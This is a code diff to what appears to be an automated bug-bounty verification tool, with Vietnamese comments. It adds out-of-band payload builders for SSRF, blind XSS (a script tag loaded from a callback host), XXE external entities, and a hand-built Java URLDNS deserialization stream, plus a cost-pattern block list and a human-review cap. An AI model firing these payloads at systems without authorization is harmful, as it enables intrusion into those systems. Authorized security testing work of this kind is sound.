@@ -23,6 +23,7 @@ import logging
 import random
 import re
 import secrets
+import struct
 import time
 import uuid
 from datetime import datetime, timedelta, timezone
@@ -35,15 +36,16 @@ from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
+from . import guardrails
 from .config import settings
-from .detect import CANDIDATE_COLS
+from .detect import CANDIDATE_COLS, cap_severity as detect_cap_severity
+from .httpverify import build_http_probe_script
 from .tools import add_log
 from .verify import (
     BENIGN_PARAM_VALUE,
     ProbeCallable,
     ProbeProfile,
     ProbeBlocked,
-    build_probe_script,
     inject_param,
     parse_probe,
 )
@@ -59,8 +61,23 @@ CORRELATION_ID_LENGTH = 20
 NONCE_LENGTH = 13
 
 # class Candidate mà vòng xác minh OOB hỗ trợ (blind — bằng chứng là callback,
-# không phải response)
-OOB_VERIFY_CLASSES = ("ssrf",)
+# không phải response): ssrf (#13) + 3 lớp batch C (#17: blind XSS, XXE,
+# deserialization)
+OOB_VERIFY_CLASSES = ("ssrf", "xss", "xxe", "deserialization")
+
+# class deserialization: payload CHỈ ping-back an toàn (không gadget thực thi)
+# — Finding luôn kèm cờ "human review required" + severity trần thận trọng
+# (chứng minh được deserialization xảy ra, KHÔNG chứng minh được impact)
+DESERIALIZATION_HUMAN_REVIEW = True
+DESERIALIZATION_SEVERITY_CAP = "medium"
+
+# payload gây cost bị cấm theo Code of Conduct Intigriti (SMS/API tốn phí,
+# tel:…): mẫu xuất hiện trong payload → guardrails HALT Run, không request
+# nào đi ra. Dương tính giả hướng AN TOÀN (halt nhầm chỉ là phiền).
+_COST_PAYLOAD_PATTERNS = (
+    "sms:", "tel:", "twilio", "vonage", "nexmo", "plivo", "messagebird",
+    "clickatell", "bulksms", "textmagic", "messaging.",
+)
 
 # callback về là bằng chứng trực tiếp — điểm cao hơn mọi tín hiệu response
 SCORE_OOB_CALLBACK = 0.95
@@ -109,6 +126,165 @@ def payload_domain(correlation_id: str, server_host: str, nonce: str) -> str:
     theo prefix độ dài 20 của MỘT nhãn DNS — payload chuẩn của client Go là
     `{correlation-id}{nonce}.{host}`."""
     return f"{correlation_id}{nonce}.{server_host}"
+
+
+# ── payload builder theo class (batch C #17) — thuần, nhúng token interactsh ──
+
+
+def ssrf_payload(token: str, domain: str) -> str:
+    """SSRF (#13): payload hệ thống — URL trỏ thẳng tới domain interactsh,
+    target fetch server-side → callback."""
+    return f"http://{token}.{domain}"
+
+
+def blind_xss_payload(token: str, domain: str) -> str:
+    """Blind XSS (#17): payload kiểu dalfox — tag script protocol-relative;
+    khi payload được lưu/lọt vào trang mà admin render, trình duyệt fetch
+    script → HTTP callback về interactsh."""
+    return f'"><script src=//{token}.{domain}></script>'
+
+
+def xxe_payload(token: str, domain: str) -> str:
+    """XXE (#17): DOCTYPE khai báo external entity SYSTEM trỏ tới interactsh
+    và tham chiếu ngay trong document — server parse XML → resolve entity →
+    HTTP callback (không đọc file, không chứa bất kỳ URI nội bộ nào)."""
+    return (
+        '<?xml version="1.0"?>'
+        f'<!DOCTYPE r [<!ENTITY v SYSTEM "http://{token}.{domain}/v">]>'
+        "<r>&v;</r>"
+    )
+
+
+# ── deserialization: stream Java dạng gadget URLDNS — CHỈ ping-back DNS ──
+# Gadget URLDNS (ysoserial): HashMap chứa java.net.URL — hashCode() của URL
+# lúc readObject là MỘT phép phân giải tên miền, không có lệnh thực thi nào.
+# Đây là payload ping-back an toàn duy nhất batch C dùng cho class này.
+
+JAVA_STREAM_MAGIC = b"\xac\xed\x00\x05"
+# serialVersionUID chuẩn của java.util.HashMap / java.net.URL (OpenJDK)
+_JAVA_HASHMAP_SVUID = 362498820763181265       # 0x0507DAC1C31660D1
+_JAVA_URL_SVUID = -2752461658742943918
+TC_OBJECT, TC_CLASSDESC, TC_STRING = 0x73, 0x72, 0x74
+TC_NULL, TC_ENDBLOCKDATA, TC_BLOCKDATA = 0x70, 0x78, 0x77
+SC_SERIALIZABLE_WRITE_METHOD = 0x03  # SC_WRITE_METHOD | SC_SERIALIZABLE
+
+
+def _j_utf(s: str) -> bytes:
+    """Chuỗi giao thức Java serialization (modified UTF-8) — ASCII-only ở đây
+    (tên class/trường/giá trị canary đều ASCII) nên length prefix là đủ."""
+    b = s.encode("ascii")
+    return len(b).to_bytes(2, "big") + b
+
+
+def _j_classdesc(
+    name: str, svuid: int, fields: list[tuple[str, str]]
+) -> bytes:
+    """TC_CLASSDESC: tên class + serialVersionUID + flags (serializable,
+    có writeObject/readObject) + descriptor trường — primitive ('I'/'F')
+    trước, object ('L' → Ljava/lang/String;) sau, đúng chuẩn JVM."""
+    out = bytearray([TC_CLASSDESC])
+    out += _j_utf(name)
+    out += svuid.to_bytes(8, "big", signed=True)
+    out.append(SC_SERIALIZABLE_WRITE_METHOD)
+    out += len(fields).to_bytes(2, "big")
+    for type_code, field_name in fields:
+        out.append(ord(type_code))
+        out += _j_utf(field_name)
+        if type_code == "L":
+            out.append(TC_STRING)
+            out += _j_utf("Ljava/lang/String;")
+    out.append(TC_ENDBLOCKDATA)  # hết descriptor trường
+    out.append(TC_NULL)          # không superclass
+    return bytes(out)
+
+
+def _j_url_object(url: str) -> bytes:
+    """TC_OBJECT java.net.URL — giá trị trường đúng thứ tự descriptor
+    (primitive trước: port; object theo tên: authority, file, host,
+    protocol, ref); handler = null (writeObject ghi tay cuối)."""
+    parts = urlsplit(url)
+    out = bytearray([TC_OBJECT])
+    out += _j_classdesc(
+        "java.net.URL", _JAVA_URL_SVUID,
+        [("I", "port"), ("L", "authority"), ("L", "file"), ("L", "host"),
+         ("L", "protocol"), ("L", "ref")],
+    )
+    out += struct.pack(">i", parts.port if parts.port else -1)
+    for value in (parts.netloc, parts.path or "", parts.hostname or "",
+                  parts.scheme, None):
+        if value is None:
+            out.append(TC_NULL)
+        else:
+            out.append(TC_STRING)
+            out += _j_utf(value)
+    out.append(TC_NULL)  # handler
+    return bytes(out)
+
+
+def java_urldns_stream(url: str) -> bytes:
+    """Stream Java serialization hoàn chỉnh của payload URLDNS: HashMap
+    (size 1) chứa java.net.URL làm key. readObject của HashMap gọi
+    hashCode() trên key → java.net.URLAndHashCode → resolve DNS `url` —
+    đúng MỘT ping-back, không class gadget thực thi nào trong stream."""
+    out = bytearray(JAVA_STREAM_MAGIC)
+    out.append(TC_OBJECT)
+    out += _j_classdesc(
+        "java.util.HashMap", _JAVA_HASHMAP_SVUID,
+        [("F", "loadFactor"), ("I", "modCount"), ("I", "size"),
+         ("I", "threshold")],
+    )
+    out += struct.pack(">f", 0.75)  # loadFactor
+    out += struct.pack(">i", 0)     # modCount
+    out += struct.pack(">i", 1)     # size
+    out += struct.pack(">i", 16)    # threshold
+    # writeObject của HashMap ghi thêm blockdata: capacity, size — rồi entries
+    out.append(TC_BLOCKDATA)
+    out.append(8)
+    out += struct.pack(">i", 16) + struct.pack(">i", 1)
+    out += _j_url_object(url)       # key — hashCode() → DNS lookup
+    out.append(TC_STRING)
+    out += _j_utf("v")              # value vô hại
+    out.append(TC_ENDBLOCKDATA)
+    return bytes(out)
+
+
+def deserialization_payload(token: str, domain: str) -> str:
+    """Insecure deserialization (#17): base64 của stream URLDNS — ping-back
+    an toàn duy nhất: KHÔNG gadget thực thi (CommonsCollections, Templates-
+    Impl…), KHÔNG JNDI/RMI. Callback chứng minh input được deserialize;
+    impact phải do người dùng xác minh tay (Finding luôn kèm cờ)."""
+    return base64.b64encode(java_urldns_stream(f"http://{token}.{domain}")).decode()
+
+
+_OOB_PAYLOAD_BUILDERS = {
+    "ssrf": ssrf_payload,
+    "xss": blind_xss_payload,
+    "xxe": xxe_payload,
+    "deserialization": deserialization_payload,
+}
+
+
+def oob_payload(cls: str, token: str, domain: str) -> str:
+    """Payload OOB của 1 class — class không hỗ trợ → ValueError."""
+    builder = _OOB_PAYLOAD_BUILDERS.get(str(cls or "").strip())
+    if builder is None:
+        raise ValueError(
+            f"class '{cls}' không thuộc lớp blind OOB: {', '.join(OOB_VERIFY_CLASSES)}"
+        )
+    return builder(token, domain)
+
+
+def find_costly_payload_pattern(payload: str) -> str | None:
+    """Mẫu gây cost (SMS/API tốn phí — Code of Conduct Intigriti) đầu tiên
+    xuất hiện trong payload; an toàn → None."""
+    low = str(payload or "").lower()
+    return next((p for p in _COST_PAYLOAD_PATTERNS if p in low), None)
+
+
+def cap_deser_severity(severity: str) -> str:
+    """Severity trần thận trọng cho deserialization — chỉ chứng minh được
+    ping-back, không tự claim RCE (mặc định cap 'medium')."""
+    return detect_cap_severity(severity, DESERIALIZATION_SEVERITY_CAP)
 
 
 def candidate_token(candidate_id: int, nonce: str) -> str:
@@ -656,9 +832,11 @@ async def list_for_candidate(pool: asyncpg.Pool, candidate_id: int) -> dict | No
 # ───────────────────────────── vòng xác minh OOB (blind class) ─────────────────────────────
 
 
+# severity $7: chỉ deserialization verified được ép trần (batch C #17) —
+# NULL thì giữ nguyên
 _OOB_VERDICT_SQL = f"""
 UPDATE candidates SET status = $2, confidence = $3, confidence_threshold = $4,
-    reject_reason = $5, oob_evidence_path = $6
+    reject_reason = $5, oob_evidence_path = $6, severity = COALESCE($7, severity)
 WHERE id = $1 RETURNING {CANDIDATE_COLS}
 """
 
@@ -672,18 +850,31 @@ async def run_oob_verification(
     poll_s: float | None = None,
     threshold: float | None = None,
 ) -> dict:
-    """Trọn vòng xác minh OOB cho Candidate blind (class `ssrf`): ensure
-    registration per-Run → payload `http://<token>.<domain>` chèn vào param →
-    baseline + PoC chạy TRONG sandbox (như mọi payload) → chờ/poll callback
-    trong cửa sổ `wait_s` → callback về = bằng chứng blind khái quát →
-    verified kèm evidence OOB; hết cửa sổ không callback → rejected kèm lý do.
+    """Trọn vòng xác minh OOB cho Candidate blind (4 lớp batch C #17: ssrf,
+    blind XSS, XXE, deserialization): ensure registration per-Run → payload
+    theo class (oob_payload) chèn vào param → baseline + PoC chạy TRONG
+    sandbox (như mọi payload) → chờ/poll callback trong cửa sổ `wait_s` →
+    callback về = bằng chứng blind khái quát → verified kèm evidence OOB;
+    hết cửa sổ không callback → rejected kèm lý do.
+
+    Deserialization: payload CHỈ ping-back an toàn (URLDNS) — Finding luôn
+    kèm cờ human review + severity ép trần. Payload gây cost (SMS/API tốn
+    phí — Code of Conduct Intigriti) → guardrails HALT Run TRƯỚC khi request
+    nào đi ra.
 
     `probe(script, target)` là seam thực thi (mặc định sandbox); `client` là
     seam interactsh. Contract lỗi giống verify redirect: target bị chặn scope
-    → ProbeBlocked (trả lifecycle về cũ); lỗi môi trường → RuntimeError.
+    → ProbeBlocked (trả lifecycle về cũ); class không hỗ trợ → ValueError;
+    lỗi môi trường → RuntimeError.
     """
     candidate_id = candidate["id"]
     run_id = candidate["run_id"]
+    cls = str(candidate.get("class") or "").strip()
+    if cls not in OOB_VERIFY_CLASSES:
+        raise ValueError(
+            f"class '{cls}' không thuộc lớp blind OOB: {', '.join(OOB_VERIFY_CLASSES)}"
+        )
+    human_review = cls == "deserialization"
     threshold = float(
         settings.verify_confidence_threshold if threshold is None else threshold
     )
@@ -702,6 +893,7 @@ async def run_oob_verification(
         return {
             "candidate_id": candidate_id,
             "run_id": run_id,
+            "class": cls,
             "verdict": verdict,
             "score": round(float(score), 4),
             "threshold": threshold,
@@ -712,9 +904,21 @@ async def run_oob_verification(
             "token": token,
             "domain": reg["domain"] if reg else None,
             "callbacks": callbacks,
+            "human_review_required": human_review,
             "evidence_path": evidence,
             "baseline_session_id": base_sid,
             "verify_session_id": poc_sid,
+        }
+
+    def _human_review_record() -> dict:
+        """Cờ human review của class deserialization — đúng 1 nơi (#17)."""
+        return {
+            "human_review_required": True,
+            "human_review_note": (
+                "Payload chỉ chứng minh input được deserialize (ping-back "
+                "URLDNS) — impact thật (RCE?) CẦN HUMAN REVIEW thêm trước "
+                "khi report; severity đã ép trần thận trọng."
+            ),
         }
 
     # không có param thì payload không có chỗ chèn — rejected ngay
@@ -724,14 +928,15 @@ async def run_oob_verification(
             "schema": "vulhunt.oob-evidence/1",
             "candidate_id": candidate_id,
             "run_id": run_id,
-            "class": candidate.get("class"),
+            "class": cls,
             "target": candidate.get("target"),
+            **(_human_review_record() if human_review else {}),
             "analysis": {"signals": [], "patterns": ["no_param"],
                          "score": 0.0, "verdict": "rejected", "reason": reason},
             "callbacks": [],
         })
         await _update(_OOB_VERDICT_SQL, candidate_id, "rejected", 0.0, threshold,
-                      reason, evidence)
+                      reason, evidence, None)
         return _summary(
             verdict="rejected", score=0.0, reason=reason, signals=[],
             patterns=["no_param"], payload="", token=None, reg=None,
@@ -741,7 +946,18 @@ async def run_oob_verification(
     # registration per-Run (domain xoay vòng, không tái sử dụng chéo Run)
     reg = await ensure_registration(pool, run_id, client)
     token = candidate_token(candidate_id, new_nonce())
-    payload = f"http://{token}.{reg['domain']}"
+    payload = oob_payload(cls, token, reg["domain"])
+
+    # payload gây cost (SMS/API tốn phí — Intigriti CoC) → HALT Run TRƯỚC khi
+    # request nào đi ra; Candidate giữ lifecycle cũ, người dùng bấm Resume
+    costly = find_costly_payload_pattern(payload)
+    if costly:
+        halt_reason = (
+            f"payload OOB class '{cls}' chứa mẫu gây cost '{costly}' — cấm theo "
+            "Code of Conduct Intigriti. Run bị HALT, không có request nào đi ra."
+        )
+        await guardrails.halt_run(pool, run_id, halt_reason)
+        raise guardrails.RunHalted(halt_reason)
 
     if probe is None:
         from . import sandbox
@@ -760,8 +976,8 @@ async def run_oob_verification(
     )
     verify_started = datetime.now(timezone.utc)
 
-    async def _run_probe(url: str) -> dict:
-        res = await probe(build_probe_script(url), candidate["target"])
+    async def _run_probe(req: dict) -> dict:
+        res = await probe(build_http_probe_script(**req), candidate["target"])
         if res.get("status") == "blocked":
             await _update(
                 f"UPDATE candidates SET status = $2 WHERE id = $1 RETURNING {CANDIDATE_COLS}",
@@ -778,11 +994,17 @@ async def run_oob_verification(
             )
         return res
 
-    baseline_url = inject_param(candidate["target"], param, BENIGN_PARAM_VALUE)
-    poc_url = inject_param(candidate["target"], param, payload)
+    baseline_req = {
+        "url": inject_param(candidate["target"], param, BENIGN_PARAM_VALUE),
+        "method": "GET", "headers": {}, "body": None,
+    }
+    poc_req = {
+        "url": inject_param(candidate["target"], param, payload),
+        "method": "GET", "headers": {}, "body": None,
+    }
 
-    base_res = await _run_probe(baseline_url)
-    poc_res = await _run_probe(poc_url)
+    base_res = await _run_probe(baseline_req)
+    poc_res = await _run_probe(poc_req)
     baseline = parse_probe(base_res.get("stdout") or "")
     poc = parse_probe(poc_res.get("stdout") or "")
     probe_error = baseline is None or poc is None
@@ -844,6 +1066,11 @@ async def run_oob_verification(
             f"({', '.join(protocols) or '—'}) từ {', '.join(sources) or '—'} — "
             "server-side đã fetch payload blind"
         )
+        if human_review:
+            reason += (
+                " · payload chỉ chứng minh deserialize/ping-back — CẦN HUMAN "
+                "REVIEW impact trước khi report"
+            )
         score = SCORE_OOB_CALLBACK
         verdict = "verified" if score >= threshold else "rejected"
     else:
@@ -860,6 +1087,13 @@ async def run_oob_verification(
         score = 0.0
         verdict = "rejected"
 
+    # deserialization verified: severity ép trần thận trọng (không tự claim RCE)
+    new_severity = (
+        cap_deser_severity(candidate.get("severity") or "info")
+        if human_review and verdict == "verified"
+        else None
+    )
+
     def _profile_or_parse_error(p: ProbeProfile | None, res: dict | None) -> dict:
         if p is not None:
             return p.to_dict()
@@ -872,9 +1106,10 @@ async def run_oob_verification(
         "created_at": datetime.now(timezone.utc).isoformat(),
         "candidate_id": candidate_id,
         "run_id": run_id,
-        "class": candidate.get("class"),
+        "class": cls,
         "target": candidate.get("target"),
         "param": param,
+        **(_human_review_record() if human_review else {}),
         "registration": {
             "id": reg["id"],
             "server_url": reg["server_url"],
@@ -901,13 +1136,14 @@ async def run_oob_verification(
     })
     await _update(
         _OOB_VERDICT_SQL, candidate_id, verdict, score, threshold,
-        reason if verdict == "rejected" else None, evidence,
+        reason if verdict == "rejected" else None, evidence, new_severity,
     )
     await add_log(
         pool, run_id,
-        f"Verify OOB Candidate #{candidate_id}: {verdict} "
+        f"Verify OOB ({cls}) Candidate #{candidate_id}: {verdict} "
         f"(score {score:.2f} / ngưỡng {threshold:.2f}) · {len(callbacks)} callback "
         f"· patterns: {', '.join(patterns) or '—'}"
+        + (" · human review required" if human_review else "")
         + (f" · evidence: {evidence}" if evidence else ""),
     )
     return _summary(
